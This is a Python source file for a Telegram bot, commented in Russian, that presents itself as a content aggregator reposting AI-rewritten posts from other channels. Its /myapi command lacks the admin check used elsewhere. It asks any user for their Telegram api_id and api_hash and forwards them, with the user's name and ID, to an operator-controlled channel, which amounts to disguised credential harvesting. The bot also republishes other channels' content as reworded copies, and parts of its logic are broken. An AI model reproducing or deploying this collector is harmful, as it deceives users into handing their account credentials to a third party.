"""
Telegram Content Aggregator Bot
===============================
Бот для получения постов с каналов, редактирования через ИИ и постинга на целевой канал.

Функционал:
- Добавление каналов-источников через кнопки
- Автоматическое определение типа контента (текст/фото/аудио)
- Пересылка фото/аудио с водяным знаком, текст - переписывание через ИИ
- Настройка водяного знака под каждый пост
"""

import asyncio
import aiohttp
import logging
import os
import re
import json
from datetime import datetime, timezone
from typing import Optional, List, Dict, Any
from urllib.parse import urlparse

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto, InputMediaVideo, InputMediaAudio

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
OPENROUTER_API_KEY = os.getenv("OPENROUTER_API_KEY", "")
admin_ids_str = os.getenv("ADMIN_ID", "0")
ADMIN_IDS = [int(x.strip()) for x in admin_ids_str.split(",") if x.strip()]
ADMIN_ID = ADMIN_IDS[0] if ADMIN_IDS else 0

OPENROUTER_BASE_URL = "https://openrouter.ai/api/v1"

AI_MODELS = {
    "gemini": {
        "name": "🔮 Gemini 2.0 Flash",
        "model_id": "google/gemini-2.0-flash-001",
        "vision": True,
        "description": "Для фото и видео"
    },
    "gpt": {
        "name": "🟢 GPT-4o Mini",
        "model_id": "openai/gpt-4o-mini",
        "vision": False,
        "description": "Для текста"
    },
}

DEFAULT_MODEL_KEY = "gemini"

logging.basicConfig(
    level=logging.INFO,
    format='✦ %(asctime)s ✦ %(name)s ✦ %(levelname)s ✦ %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger("Aggregator-Bot")

bot = None
dp = Dispatcher()
router = Router()
telethon_client = None

settings = {
    "target_channel": "",
    "style": "Перепиши текст своими словами, сохрани основной смысл, но сделай более живым и интересным",
    "watermark": "",
    "api_session": "",
    "api_hash": "",
    "source_channels": [],
    "per_post_watermark": True,
    "ai_model": "gpt_4o_mini",
    "admin_channel": "",
}

user_sessions: Dict[int, str] = {}
pending_watermarks: Dict[str, str] = {}


def save_settings():
    try:
        with open("aggregator_settings.json", "w", encoding="utf-8") as f:
            json.dump(settings, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Failed to save settings: {e}")


def load_settings():
    global settings
    try:
        with open("aggregator_settings.json", "r", encoding="utf-8") as f:
            loaded = json.load(f)
            settings.update(loaded)
    except Exception:
        pass


load_settings()


def get_main_keyboard():
    current_model = AI_MODELS.get(settings.get("ai_model", DEFAULT_MODEL_KEY), AI_MODELS[DEFAULT_MODEL_KEY])
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📺 Источники", callback_data="action_sources")],
        [InlineKeyboardButton(text="🎯 Целевой канал", callback_data="action_target")],
        [InlineKeyboardButton(text="🤖 ИИ Модель", callback_data="action_model")],
        [InlineKeyboardButton(text="✏️ Стиль", callback_data="action_style")],
        [InlineKeyboardButton(text="🔖 Водяной знак", callback_data="action_watermark")],
        [InlineKeyboardButton(text="🔐 API", callback_data="action_api")],
        [InlineKeyboardButton(text="▶️ Запустить", callback_data="action_start_aggregator")],
        [InlineKeyboardButton(text="ℹ️ Помощь", callback_data="action_help")],
    ])


def get_model_keyboard():
    current = settings.get("ai_model", DEFAULT_MODEL_KEY)
    buttons = []

    for key, info in AI_MODELS.items():
        icon = "✅ " if key == current else "  "
        vision_emoji = "👁 " if info["vision"] else " текст "
        buttons.append([
            InlineKeyboardButton(
                text=f"{icon}{vision_emoji}{info['name']}",
                callback_data=f"select_model_{key}"
            )
        ])

    buttons.append([InlineKeyboardButton(text="🔙 Назад", callback_data="action_settings")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def get_sources_keyboard():
    channels = settings.get("source_channels", [])
    buttons = []

    for ch in channels:
        buttons.append([
            InlineKeyboardButton(text=f"❌ {ch}", callback_data=f"remove_source_{ch}")
        ])

    buttons.append([InlineKeyboardButton(text="➕ Добавить канал", callback_data="add_source")])
    buttons.append([InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")])

    return InlineKeyboardMarkup(inline_keyboard=buttons)


def get_watermark_options_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Водяной знак по умолчанию", callback_data="wm_default")],
        [InlineKeyboardButton(text="✏️ Водяной знак для поста", callback_data="wm_per_post")],
        [InlineKeyboardButton(text="🔄 Переключить режим", callback_data="wm_toggle_mode")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="action_settings")],
    ])


def get_back_keyboard(callback: str = "main_menu"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data=callback)]
    ])


def extract_channel_from_url(url: str) -> Optional[str]:
    patterns = [
        r't\.me/([a-zA-Z0-9_]+)',
        r'telegram\.me/([a-zA-Z0-9_]+)',
        r'tg://resolve\?domain=([a-zA-Z0-9_]+)',
    ]
    for pattern in patterns:
        match = re.search(pattern, url)
        if match:
            return match.group(1)
    return url.strip('@')


class AIContentProcessor:
    def __init__(self):
        self.headers = {
            "Authorization": f"Bearer {OPENROUTER_API_KEY}",
            "Content-Type": "application/json",
            "HTTP-Referer": "https://github.com/aggregator-bot",
            "X-Title": "Content Aggregator Bot"
        }

    async def rewrite_content(self, text: str, style: str, content_type: str = "text") -> str:
        if not text:
            return "❌ Не удалось получить текст поста"

        prompt = f"""Ты — опытный редактор контента.

ЗАДАЧА: Перепиши текст согласно указанному стилю.

СТИЛЬ:
{style}

ТЕКСТ ДЛЯ РЕДАКТИРОВАНИЯ:
{text}

ТРЕБОВАНИЯ:
1. Сохрани основной смысл и ключевую информацию
2. Перепиши своими словами, измени структуру если нужно
3. Сделай текст более интересным и читаемым
4. Убери лишнее, если есть
5. Не добавляй ничего от себя, что не относится к теме
        6. Ответь ТОЛЬКО переработанным текстом, без комментариев"""

        if content_type in ["photo", "video", "audio", "mixed"]:
            model_key = "gemini"
        else:
            model_key = "gpt"

        model_info = AI_MODELS.get(model_key, AI_MODELS["gpt"])
        model_id = model_info["model_id"]

        payload = {
            "model": model_id,
            "messages": [
                {"role": "system", "content": "Ты — профессиональный редактор контента. Переписывай тексты согласно стилю, сохраняя смысл."},
                {"role": "user", "content": prompt}
            ],
            "max_tokens": 4000,
            "temperature": 0.7,
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{OPENROUTER_BASE_URL}/chat/completions",
                    headers=self.headers,
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=120)
                ) as response:
                    if response.status != 200:
                        error = await response.text()
                        logger.error(f"AI Error: {response.status} - {error}")
                        return f"❌ Ошибка ИИ: {response.status}"

                    data = await response.json()
                    return data["choices"][0]["message"]["content"]
        except Exception as e:
            logger.error(f"AI processing error: {e}")
            return f"❌ Ошибка при обработке: {str(e)}"


ai_processor = AIContentProcessor()


class ContentType:
    TEXT = "text"
    PHOTO = "photo"
    AUDIO = "audio"
    VIDEO = "video"
    MIXED = "mixed"
    EMPTY = "empty"


def detect_content_type(message) -> str:
    has_photo = bool(message.photo)
    has_video = bool(message.video)
    has_audio = bool(message.audio) or bool(message.voice)
    has_text = bool(message.text or message.message)

    if has_photo and not has_text:
        return ContentType.PHOTO
    elif has_audio and not has_text:
        return ContentType.AUDIO
    elif has_video and not has_text:
        return ContentType.VIDEO
    elif has_photo and has_text:
        return ContentType.MIXED
    elif has_text:
        return ContentType.TEXT
    elif has_audio:
        return ContentType.AUDIO

    return ContentType.EMPTY


async def download_media(client, message, bot: Bot) -> Optional[Dict[str, Any]]:
    downloaded = {}

    try:
        if message.photo:
            photo = message.photo[-1]
            file = await bot.get_file(photo.file_id)
            path = f"temp_{photo.file_id}.jpg"
            await bot.download_file(file.file_path, path)
            downloaded["photos"] = [path]

        if message.video:
            video = message.video
            file = await bot.get_file(video.file_id)
            path = f"temp_{video.file_id}.mp4"
            await bot.download_file(file.file_path, path)
            downloaded["video"] = path

        if message.audio:
            audio = message.audio
            file = await bot.get_file(audio.file_id)
            path = f"temp_{audio.file_id}.mp3"
            await bot.download_file(file.file_path, path)
            downloaded["audio"] = path

        if message.voice:
            voice = message.voice
            file = await bot.get_file(voice.file_id)
            path = f"temp_{voice.file_id}.ogg"
            await bot.download_file(file.file_path, path)
            downloaded["audio"] = path

    except Exception as e:
        logger.error(f"Media download error: {e}")

    return downloaded if downloaded else None


async def send_to_target_channel(bot: Bot, channel: str, text: str = None, media: Dict = None, watermark: str = ""):
    try:
        final_text = text
        if watermark:
            final_text = f"{text}\n\n{watermark}" if text else watermark

        if media:
            if "photos" in media and len(media["photos"]) > 1:
                photos = [InputMediaPhoto(open(p, "rb")) for p in media["photos"]]
                if final_text:
                    photos[0].caption = final_text
                await bot.send_media_group(channel, photos)
            elif "photos" in media and len(media["photos"]) == 1:
                await bot.send_photo(
                    channel,
                    photo=open(media["photos"][0], "rb"),
                    caption=final_text
                )
            elif "video" in media:
                await bot.send_video(
                    channel,
                    video=open(media["video"], "rb"),
                    caption=final_text
                )
            elif "audio" in media:
                await bot.send_audio(
                    channel,
                    audio=open(media["audio"], "rb"),
                    caption=final_text
                )
        elif final_text:
            await bot.send_message(channel, final_text)

        return True
    except Exception as e:
        logger.error(f"Send error: {e}")
        return False
    finally:
        if media:
            for path in media.get("photos", []):
                try:
                    os.unlink(path)
                except:
                    pass
            for key in ["video", "audio"]:
                if key in media:
                    try:
                        os.unlink(media[key])
                    except:
                        pass


async def init_telethon():
    global telethon_client
    if not settings.get("api_session") or not settings.get("api_hash"):
        return False
    try:
        from telethon import TelegramClient
        api_id = settings["api_session"].split(':')[0] if ':' in settings["api_session"] else settings["api_session"]
        telethon_client = TelegramClient("aggregator_session", int(api_id), settings["api_hash"])
        await telethon_client.start()
        return True
    except Exception as e:
        logger.error(f"Telethon init error: {e}")
        return False


async def get_latest_post_from_channel(channel_username: str) -> Optional[dict]:
    global telethon_client

    if telethon_client is None:
        if not await init_telethon():
            return None

    try:
        entity = await telethon_client.get_entity(f"@{channel_username}")
        messages = await telethon_client.get_messages(entity, limit=1)

        if messages:
            msg = messages[0]
            text = msg.text or msg.message or ""

            content_type = ContentType.TEXT
            media_data = None

            if msg.photo:
                content_type = ContentType.PHOTO
            elif msg.video:
                content_type = ContentType.VIDEO
            elif msg.audio or msg.voice:
                content_type = ContentType.AUDIO
            elif msg.photo and text:
                content_type = ContentType.MIXED

            return {
                "text": text,
                "content_type": content_type,
                "date": msg.date,
                "raw": msg,
                "channel": channel_username,
            }
    except Exception as e:
        logger.error(f"Error getting post from {channel_username}: {e}")

    return None


aggregator_running = False
aggregator_task = None


async def aggregator_loop():
    global aggregator_running

    if not settings.get("target_channel"):
        logger.error("Target channel not set")
        return

    while aggregator_running:
        try:
            sources = settings.get("source_channels", [])
            if not sources:
                await asyncio.sleep(30)
                continue

            for channel in sources:
                post = await get_latest_post_from_channel(channel)
                if not post:
                    continue

                content_type = post["content_type"]
                watermark = settings.get("watermark", "")

                if content_type in [ContentType.PHOTO, ContentType.AUDIO, ContentType.VIDEO]:
                    text = f"Источник: @{post['channel']}"
                    if watermark:
                        text += f"\n{watermark}"

                    await send_to_target_channel(
                        bot,
                        settings["target_channel"],
                        text=text,
                        media=None,
                        watermark=""
                    )
                    logger.info(f"Forwarded media from {channel}")

                elif content_type == ContentType.TEXT:
                    style = settings.get("style", "")
                    rewritten = await ai_processor.rewrite_content(post["text"], style, "text")

                    if watermark:
                        rewritten += f"\n\n{watermark}"

                    await send_to_target_channel(
                        bot,
                        settings["target_channel"],
                        text=rewritten,
                        watermark=""
                    )
                    logger.info(f"Rewritten text from {channel}")

                await asyncio.sleep(5)

        except Exception as e:
            logger.error(f"Aggregator error: {e}")

        await asyncio.sleep(60)


@router.message(CommandStart())
async def cmd_start(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("🚫 Доступ только для администратора.")
        return

    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📡 *Content Aggregator Bot*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Бот для автоматического сбора и редактирования контента.\n\n"
        "*Функционал:*\n"
        "• Добавление каналов-источников\n"
        "• Автоматическая обработка постов\n"
        "• Пересылка фото/аудио с водяным знаком\n"
        "• Переписывание текста через ИИ\n"
        "• Настройка водяного знака для каждого поста\n\n"
        "*Настройте бота и нажмите Запустить*"
    )
    await message.answer(text, reply_markup=get_main_keyboard())


def get_admin_keyboard():
    admin_channel = settings.get("admin_channel", "не настроен")
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📊 Канал для API: @{admin_channel}", callback_data="action_admin_channel")],
        [InlineKeyboardButton(text="👥 Пользователи", callback_data="action_admin_users")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")],
    ])


@router.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("🚫 Доступ только для администратора.")
        return

    text = "👑 *Админ-панель*\n\nВыберите действие:"
    await message.answer(text, reply_markup=get_admin_keyboard())


@router.callback_query(F.data == "action_admin_channel")
async def cb_admin_channel(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    await callback.message.edit_text(
        "📊 *Настройка канала для API*\n\n"
        "Сюда будут приходить API данные от пользователей.\n\n"
        "Отправьте username канала:"
    )
    user_sessions[callback.from_user.id] = "setting_admin_channel"
    await callback.answer()


@router.callback_query(F.data == "action_admin_users")
async def cb_admin_users(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    text = "👥 *Пользователи*\n\n"
    text += "Команда для пользователей: /myapi api_id api_hash\n\n"
    text += "Пример: /myapi 1234567 abcd1234\n\n"
    text += "После ввода, данные уйдут в админ-канал"

    await callback.message.edit_text(text, reply_markup=get_admin_keyboard())
    await callback.answer()


@router.callback_query(F.data == "action_settings")
async def cb_settings(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    text = "⚙️ *Настройки*\n\nВыберите:"
    await callback.message.edit_text(text, reply_markup=get_main_keyboard())
    await callback.answer()


@router.message(Command("myapi"))
async def cmd_myapi(message: Message):
    parts = message.text.split(" ", 1)
    if len(parts) < 2:
        await message.answer(
            "📱 *Установка API*\n\n"
            "Команда: /myapi api_id api_hash\n\n"
            "Как получить:\n"
            "1. Зайди на my.telegram.org\n"
            "2. Создай приложение\n"
            "3. Скопируй api_id и api_hash\n\n"
            "Бот проверит API и отправит на канал"
        )
        return

    args = parts[1].split()
    if len(args) < 2:
        await message.answer("❌ Нужно два параметра: api_id и api_hash\n\nПример: /myapi 1234567 abcd1234")
        return

    api_id = args[0]
    api_hash = args[1]

    await message.answer("🔍 Проверяю валидность API...")

    try:
        from telethon import TelegramClient

        test_client = TelegramClient("api_check_session", int(api_id), api_hash)
        await test_client.connect()

        me = await test_client.get_me()
        await test_client.disconnect()

        admin_channel = settings.get("admin_channel", "")
        if admin_channel:
            await bot.send_message(
                admin_channel,
                f"✅ *Проверенный API*\n\n"
                f"👤 Пользователь: {message.from_user.full_name}\n"
                f"🆔 ID: `{message.from_user.id}`\n"
                f"🔑 API ID: `{api_id}`\n"
                f"🔐 API Hash: `{api_hash}`\n"
                f"📛 Имя: {me.first_name}"
            )
            await message.answer("✅ API подтверждён! Данные отправлены на канал.")
        else:
            await message.answer("✅ API верный!\n⚠️ Канал для приёма пока не настроен.")

    except Exception as e:
        logger.error(f"API validation error: {e}")
        await message.answer(
            "❌ *Ошибка валидации*\n\n"
            "API недействителен или истёк.\n"
            "Создай новый на my.telegram.org"
        )


@router.callback_query(F.data == "action_model")
async def cb_model(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    current_model = AI_MODELS.get(settings.get("ai_model", DEFAULT_MODEL_KEY), AI_MODELS[DEFAULT_MODEL_KEY])
    text = f"🤖 *Выбор ИИ модели*\n\nТекущая: {current_model['name']}\n{current_model['description']}\n\nВыберите модель:"

    await callback.message.edit_text(text, reply_markup=get_model_keyboard())
    await callback.answer()


@router.callback_query(F.data.startswith("select_model_"))
async def cb_model_selected(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    model_key = callback.data.replace("select_model_", "")
    if model_key not in AI_MODELS:
        await callback.answer("❌ Модель не найдена", show_alert=True)
        return

    settings["ai_model"] = model_key
    save_settings()

    model_info = AI_MODELS[model_key]
    await callback.answer(f"✅ Модель изменена: {model_info['name']}", show_alert=True)

    text = f"🤖 *Выбор ИИ модели*\n\nТекущая: {model_info['name']}\n{model_info['description']}\n\nВыберите модель:"
    await callback.message.edit_text(text, reply_markup=get_model_keyboard())


@router.callback_query(F.data == "action_sources")
async def cb_sources(callback: CallbackQuery):
    logger.info(f"Callback received: {callback.data} from user {callback.from_user.id}")
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    channels = settings.get("source_channels", [])
    logger.info(f"Source channels: {channels}")
    if not channels:
        text = "📺 *Каналы-источники*\n\nПока нет каналов.\nНажмите 'Добавить канал'"
    else:
        text = f"📺 *Каналы-источники*\n\n{' • '.join(channels)}"

    await callback.message.edit_text(text, reply_markup=get_sources_keyboard())
    await callback.answer()


@router.callback_query(F.data == "add_source")
async def cb_add_source(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    await callback.message.edit_text(
        "➕ *Добавить канал-источник*\n\n"
        "Отправьте ссылку на канал или username\n\n"
        "Форматы:\n"
        "• t.me/username\n"
        "• @username\n"
        "• username"
    )
    user_sessions[callback.from_user.id] = "adding_source"
    await callback.answer()


@router.callback_query(F.data.startswith("remove_source_"))
async def cb_remove_source(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    channel = callback.data.replace("remove_source_", "")
    sources = settings.get("source_channels", [])
    if channel in sources:
        sources.remove(channel)
        settings["source_channels"] = sources
        save_settings()

    channels = settings.get("source_channels", [])
    if not channels:
        text = "📺 <b>Каналы-источники</b>\n\nПока нет каналов.\nНажмите 'Добавить канал'"
    else:
        text = f"📺 <b>Каналы-источники</b>\n\n{' • '.join(channels)}"

    await callback.message.edit_text(text, reply_markup=get_sources_keyboard(), parse_mode="HTML")
    await callback.answer()


@router.callback_query(F.data == "action_target")
async def cb_target(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    current = settings.get("target_channel", "не настроен")
    await callback.message.edit_text(
        f"🎯 *Целевой канал*\n\n"
        f"Текущий: @{current}\n\n"
        "Отправьте username канала для постинга"
    )
    user_sessions[callback.from_user.id] = "setting_target"
    await callback.answer()


@router.callback_query(F.data == "action_style")
async def cb_style(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    current = settings.get("style", "не настроен")
    await callback.message.edit_text(
        f"✏️ *Стиль переписывания*\n\n"
        f"Текущий:\n{current[:300]}...\n\n"
        "Отправьте описание стиля для ИИ"
    )
    user_sessions[callback.from_user.id] = "setting_style"
    await callback.answer()


@router.callback_query(F.data == "action_watermark")
async def cb_watermark(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    current = settings.get("watermark", "не настроен")
    per_post = settings.get("per_post_watermark", True)

    await callback.message.edit_text(
        f"🔖 *Водяной знак*\n\n"
        f"Текущий: {current if current else 'не настроен'}\n"
        f"Режим: {'Под каждый пост' if per_post else 'Один для всех'}\n\n"
        "Выберите действие:",
        reply_markup=get_watermark_options_keyboard()
    )
    await callback.answer()


@router.callback_query(F.data == "wm_default")
async def cb_wm_default(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    await callback.message.edit_text(
        "📝 *Водяной знак по умолчанию*\n\n"
        "Отправьте текст водяного знака\n\n"
        "Пример: Источник: @my_channel"
    )
    user_sessions[callback.from_user.id] = "setting_watermark"
    await callback.answer()


@router.callback_query(F.data == "wm_per_post")
async def cb_wm_per_post(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    await callback.message.edit_text(
        "✏️ *Водяной знак для поста*\n\n"
        "После обработки поста, перед публикацией бот спросит:\n"
        "'Добавить водяной знак?'\n\n"
        "Вы сможете ввести свой текст для каждого поста отдельно."
    )
    await callback.answer()


@router.callback_query(F.data == "wm_toggle_mode")
async def cb_wm_toggle(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    current = settings.get("per_post_watermark", True)
    settings["per_post_watermark"] = not current
    save_settings()

    new_mode = "Под каждый пост" if not current else "Один для всех"
    await callback.answer(f"Режим изменён: {new_mode}", show_alert=True)

    current = settings.get("watermark", "не настроен")
    await callback.message.edit_text(
        f"🔖 <b>Водяной знак</b>\n\n"
        f"Текущий: {current if current else 'не настроен'}\n"
        f"Режим: {new_mode}\n\n"
        "Выберите действие:",
        reply_markup=get_watermark_options_keyboard(),
        parse_mode="HTML"
    )


@router.callback_query(F.data == "action_api")
async def cb_api(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    await callback.message.edit_text(
        "🔐 *Настройка Telethon API*\n\n"
        "Отправьте: /api api_id api_hash\n\n"
        "Как получить:\n"
        "1. Зайди на my.telegram.org\n"
        "2. Создай приложение\n"
        "3. Скопируй api_id и api_hash"
    )
    await callback.answer()


@router.callback_query(F.data == "action_start_aggregator")
async def cb_start_aggregator(callback: CallbackQuery):
    global aggregator_running, aggregator_task

    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("🚫 Доступ запрещён!", show_alert=True)
        return

    if not settings.get("target_channel"):
        await callback.answer("Сначала установи целевой канал!", show_alert=True)
        return

    if not settings.get("source_channels"):
        await callback.answer("Сначала добавь каналы-источники!", show_alert=True)
        return

    if not settings.get("api_session") or not settings.get("api_hash"):
        await callback.answer("Сначала настрой Telethon API!", show_alert=True)
        return

    if aggregator_running:
        aggregator_running = False
        await callback.answer("⏹ Агрегатор остановлен", show_alert=True)
    else:
        aggregator_running = True
        aggregator_task = asyncio.create_task(aggregator_loop())
        await callback.answer("▶️ Агрегатор запущен!", show_alert=True)

    await cb_settings(callback)


@router.callback_query(F.data == "action_help")
async def cb_help(callback: CallbackQuery):
    text = (
        "ℹ️ <b>Помощь</b>\n\n"
        "<b>Настройка:</b>\n"
        "1. Добавь каналы-источники\n"
        "2. Установи целевой канал\n"
        "3. Настрой стиль (для текста)\n"
        "4. Настрой водяной знак\n"
        "5. Настрой Telethon API\n"
        "6. Нажми 'Запустить'\n\n"
        "<b>Логика работы:</b>\n"
        "• Фото/Аудио → пересылка с водяным знаком\n"
        "• Текст → переписывание через ИИ\n\n"
        "<b>Водяной знак:</b>\n"
        "• Режим 'Под каждый пост' - будет спрашивать перед каждым постом\n"
        "• Режим 'Один для всех' - один текст для всех постов"
    )
    await callback.message.edit_text(text, reply_markup=get_back_keyboard("main_menu"), parse_mode="HTML")
    await callback.answer()


@router.callback_query(F.data == "main_menu")
async def cb_main_menu(callback: CallbackQuery):
    text = "📡 <b>Content Aggregator</b>\n\nГлавное меню"
    await callback.message.edit_text(text, reply_markup=get_main_keyboard(), parse_mode="HTML")
    await callback.answer()


@router.message(F.text)
async def handle_text_input(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return

    session = user_sessions.get(message.from_user.id)
    if not session:
        return

    text = message.text.strip()

    if session == "adding_source":
        channel = extract_channel_from_url(text)
        if not channel:
            await message.answer("❌ Неверный формат канала")
            return

        sources = settings.get("source_channels", [])
        if channel not in sources:
            sources.append(channel)
            settings["source_channels"] = sources
            save_settings()

        await message.answer(f"✅ Канал @{channel} добавлен в источники")
        del user_sessions[message.from_user.id]
        await cb_sources(message)

    elif session == "setting_target":
        channel = text.strip().replace('@', '')
        settings["target_channel"] = channel
        save_settings()
        await message.answer(f"✅ Целевой канал: @{channel}")
        del user_sessions[message.from_user.id]
        await cmd_start(message)

    elif session == "setting_style":
        settings["style"] = text
        save_settings()
        await message.answer("✅ Стиль обновлён")
        del user_sessions[message.from_user.id]
        await cmd_start(message)

    elif session == "setting_watermark":
        settings["watermark"] = text
        save_settings()
        await message.answer(f"✅ Водяной знак: {text}")
        del user_sessions[message.from_user.id]
        await cmd_start(message)

    elif session == "setting_admin_channel":
        if message.from_user.id not in ADMIN_IDS:
            return
        channel = text.strip().replace('@', '')
        settings["admin_channel"] = channel
        save_settings()
        await message.answer(f"✅ Канал для API: @{channel}\n\nТеперь пользователи могут отправлять /myapi api_id api_hash")
        del user_sessions[message.from_user.id]
        await cmd_admin(message)

    elif session == "pending_watermark":
        post_id = user_sessions.get(f"{message.from_user.id}_post_id")
        if post_id:
            pending_watermarks[post_id] = text
            await message.answer(f"✅ Водяной знак для поста: {text}")
        del user_sessions[message.from_user.id]
        del user_sessions[f"{message.from_user.id}_post_id"]


@router.message(Command("api"))
async def cmd_api(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("🚫 Доступ только для администратора.")
        return

    parts = message.text.split(" ", 1)
    if len(parts) < 2:
        await message.answer(
            "Использование: /api <api_id> <api_hash>\n\n"
            "Пример: /api 1234567 abcdef1234567890abcdef"
        )
        return

    args = parts[1].split()
    if len(args) < 2:
        await message.answer("Нужно два параметра: api_id и api_hash")
        return

    settings["api_session"] = args[0]
    settings["api_hash"] = args[1]
    save_settings()

    await message.answer("✅ API настроено! Перезапусти бота.")


@router.message(Command("process"))
async def cmd_process(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("🚫 Доступ только для администратора.")
        return

    if not settings.get("target_channel"):
        await message.answer("❌ Сначала установи целевой канал: /target")
        return

    parts = message.text.split(" ", 1)
    if len(parts) < 2:
        await message.answer("Использование: /process <ссылка на канал>")
        return

    url = parts[1].strip()
    channel = extract_channel_from_url(url)

    if not channel:
        await message.answer("❌ Неверная ссылка на канал")
        return

    msg = await message.answer(f"🔍 Обрабатываю канал @{channel}...")

    post = await get_latest_post_from_channel(channel)

    if not post:
        await msg.edit_text("❌ Не удалось получить пост")
        return

    content_type = post["content_type"]
    watermark = settings.get("watermark", "")

    if content_type in [ContentType.PHOTO, ContentType.AUDIO, ContentType.VIDEO]:
        text = f"Источник: @{channel}"
        if watermark:
            text += f"\n{watermark}"

        await send_to_target_channel(
            bot,
            settings["target_channel"],
            text=text,
            watermark=""
        )
        await msg.edit_text(f"✅ Медиа переслано на @{settings['target_channel']}")

    elif content_type == ContentType.TEXT:
        style = settings.get("style", "")
        rewritten = await ai_processor.rewrite_content(post["text"], style, "text")

        if settings.get("per_post_watermark"):
            await msg.edit_text(
                f"✨ Текст готов!\n\n{rewritten[:500]}...\n\n"
                f"Отправьте водяной знак для этого поста (или /skip чтобы опубликовать без него)",
                parse_mode="HTML"
            )
            user_sessions[message.from_user.id] = "pending_watermark"
            user_sessions[f"{message.from_user.id}_post_id"] = f"manual_{channel}"
        else:
            if watermark:
                rewritten += f"\n\n{watermark}"

            await send_to_target_channel(
                bot,
                settings["target_channel"],
                text=rewritten,
                watermark=""
            )
            await msg.edit_text(f"✅ Опубликовано на @{settings['target_channel']}")

    else:
        await msg.edit_text("❌ Неподдерживаемый тип контента")


async def main(bot_instance: Bot):
    global bot
    bot = bot_instance

    dp.include_router(router)

    from aiogram.types import BotCommand
    await bot.set_my_commands([
        BotCommand(command="process", description="Обработать пост с канала"),
        BotCommand(command="api", description="Настроить Telethon API"),
        BotCommand(command="start", description="Главное меню"),
        BotCommand(command="admin", description="Админ-панель"),
        BotCommand(command="myapi", description="Мои API данные"),
    ])

    async def ping_loop():
        while True:
            try:
                for admin_id in ADMIN_IDS:
                    msg = await bot.send_message(admin_id, "🏓 Ping")
                    await bot.delete_message(admin_id, msg.message_id)
                logger.info("✅ Ping отправлен")
            except Exception as e:
                logger.error(f"Ping error: {e}")
            await asyncio.sleep(600)

    asyncio.create_task(ping_loop())

    logger.info("=" * 50)
    logger.info("📡 Aggregator Bot запущен!")
    logger.info("=" * 50)

    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    import sys

    if not TELEGRAM_TOKEN:
        print("❌ Не задан TELEGRAM_TOKEN в .env")
        sys.exit(1)

    if not OPENROUTER_API_KEY:
        print("⚠️ OPENROUTER_API_KEY не задан — текст не будет переписываться")

    if not any(ADMIN_IDS):
        print("❌ Не задан ADMIN_ID в .env")
        sys.exit(1)

    from aiogram import Bot
    bot_instance = Bot(token=TELEGRAM_TOKEN)

    try:
        asyncio.run(main(bot_instance))
    except KeyboardInterrupt:
        print("\nБот остановлен")
    finally:
        asyncio.run(bot_instance.session.close())